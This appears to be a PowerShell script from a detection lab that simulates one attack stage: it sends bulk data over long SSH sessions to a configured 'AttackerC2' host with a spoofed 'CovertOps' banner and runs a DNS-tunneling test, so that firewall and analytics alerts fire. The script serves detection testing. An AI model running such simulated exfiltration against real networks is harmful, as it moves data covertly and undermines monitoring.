<#
    Stage 3 (MIDDLE) - Long, high-volume SSH tunnel
    ===============================================
    The covert SSH channel carries an unusually large amount of data over an
    abnormally long session - the signature of a data-exfil / pivot tunnel.

      EAL alert : 'Unusual SSH Activity'  (rule f1545c54)
      ATT&CK    : Command & Control (TA0011) / Protocol Tunneling (T1572)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 3 (Covert channel): long high-volume SSH tunnel to $($cfg.AttackerC2):$($cfg.SshPort)" "INFO"
# push a few hundred KB and hold the session open to look like a tunnel
Invoke-SshConn -Server $cfg.AttackerC2 -Port $cfg.SshPort -ClientBanner "SSH-2.0-CovertOps_0.9" -SendKB 256 -HoldSeconds 3 -Label "tunnel bulk-1"
Invoke-SshConn -Server $cfg.AttackerC2 -Port $cfg.SshPort -ClientBanner "SSH-2.0-CovertOps_0.9" -SendKB 384 -HoldSeconds 3 -Label "tunnel bulk-2"
Invoke-TestDns -Category "dnstun"
Write-Stage "STAGE 3 done. Expect FW NGFW: DNS-Security DNS-tunneling + (once baselined) EAL 'Unusual SSH Activity' f1545c54." "OK"
